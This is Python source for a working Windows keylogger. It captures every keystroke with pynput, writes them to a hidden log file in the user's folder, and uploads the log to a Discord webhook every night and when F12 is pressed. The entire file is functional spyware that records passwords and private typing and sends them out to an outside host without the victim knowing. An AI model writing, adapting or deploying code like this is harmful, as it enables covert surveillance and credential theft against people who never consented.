import stat
from pynput import keyboard
import datetime
import requests
import os
import threading
import time
import getpass
import ctypes

USER_NAME = getpass.getuser()
USER_DIR = os.path.expanduser(f"C:/Users/{USER_NAME}/Source")
if not os.path.exists(USER_DIR):
    os.makedirs(USER_DIR)
LOG_FILE = os.path.join(USER_DIR, "KeyLog.x")


if not os.path.exists(LOG_FILE):
    open(LOG_FILE, "w").close()
    ctypes.windll.kernel32.SetFileAttributesW(LOG_FILE, 2)  

WEBHOOK_URL = "DISCORD_WEBHOOK_URL" # Replace with your Discord webhook URL
pressed_keys = set()

def send_file_to_discord():
    if not os.path.exists(LOG_FILE):
        print("LogFile not Found.")
        return

    with open(LOG_FILE, "rb") as f:
        files = {"file": (f"KeyLog_{datetime.datetime.now().date()}.txt", f)}
        data = {"content": f"KeyLog van {datetime.datetime.now().date()} ({USER_NAME})"}
        response = requests.post(WEBHOOK_URL, data=data, files=files)
    if response.status_code in (200, 204):
        # print("Zend To Discord.")
        os.chmod(LOG_FILE, stat.S_IWRITE)
        archive_path = LOG_FILE + f".{int(time.time())}.bak"
        os.rename(LOG_FILE, archive_path)
        open(LOG_FILE, "w").close()
        ensure_logfile_header() 
    else:
        print("Error by sending:", response.status_code, response.text)

def ensure_logfile_header():
    if not os.path.exists(LOG_FILE) or os.path.getsize(LOG_FILE) == 0:
        with open(LOG_FILE, "a", encoding="utf-8") as logKey:
            logKey.write(f"User: {USER_NAME}\n")

def keyPressed(key):
    x = datetime.datetime.now()
    key_str = ""
    pressed_keys.add(key)

    if (keyboard.Key.ctrl_l in pressed_keys or keyboard.Key.ctrl_r in pressed_keys) and hasattr(key, 'char') and key.char is not None:
        if key.char.lower() == 'c':
            key_str = "[CTRL+C]"
        elif key.char.lower() == 'v':
            key_str = "[CTRL+V]"
    if not key_str and hasattr(key, 'char') and key.char is not None:
        if ord(key.char) < 32:
            key_str = f"[CTRL+{chr(ord(key.char)+64)}]"
        else:
            key_str = key.char
    if not key_str:
        key_str = f"[{str(key).replace('Key.', '').upper()}]"

    with open(LOG_FILE, "a", encoding="utf-8") as logKey:
        logKey.write(f"{key_str}      {x}\n")


    if key == keyboard.Key.f12:
        send_file_to_discord()

def keyReleased(key):
    if key in pressed_keys:
        pressed_keys.remove(key)

def daily_sender():
    while True:
        now = datetime.datetime.now()
        if now.hour == 1 and now.minute == 0:
            send_file_to_discord()
            time.sleep(61)
        else:
            time.sleep(30)

if __name__ == "__main__":
    send_file_to_discord()
    ensure_logfile_header()
    threading.Thread(target=daily_sender, daemon=True).start()
    listener = keyboard.Listener(on_press=keyPressed, on_release=keyReleased)
    listener.start()
    input()